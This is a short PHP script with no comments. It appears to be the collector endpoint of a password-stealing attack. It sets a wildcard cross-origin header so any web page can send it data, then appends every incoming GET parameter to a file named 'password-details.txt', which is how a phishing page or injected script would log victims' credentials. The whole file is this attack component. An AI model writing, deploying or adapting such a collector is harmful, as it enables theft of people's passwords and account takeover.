<?php

header('Access-Control-Allow-Origin: *');
$fh = fopen('password-details.txt', 'a');

fwrite($fh, print_r($_GET, TRUE));
